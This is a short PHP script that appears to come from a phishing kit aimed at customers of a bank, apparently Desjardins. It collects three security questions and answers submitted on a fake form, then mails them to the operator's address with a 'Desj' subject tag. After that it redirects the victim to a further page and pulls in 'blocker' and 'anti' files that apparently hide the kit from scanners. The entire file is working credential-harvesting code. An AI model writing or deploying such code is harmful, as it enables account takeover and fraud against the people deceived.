<?php
 include 'email.php';
    include 'blocker.php';
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';

    $ip = $_SERVER['REMOTE_ADDR'];
    $UA = $_SERVER['HTTP_USER_AGENT'];
    $qu1 = $_POST['q1'];
    $re1 = $_POST['r1'];
    $qu2 = $_POST['q2'];
    $re2 = $_POST['r2'];
    $qu3 = $_POST['q3'];
    $re3 = $_POST['r3'];
     $user = $_GET['name'];
    $data ="
  _________________________________
   
   Q1: $qu1
   -
   R1: $re1
   --------------------------------
   Q2: $qu2
   -
   R2: $re2
   --------------------------------
   Q3: $qu3
   -
   R3: $re3
   _________________________________
    
    ";
    
    $subj="|Desj|Q/R|-$user-|";
    
    
    mail($to, $subj, $data);
    
    header("refresh: 1; url= 3.php?name=" . $user);
    
    ?>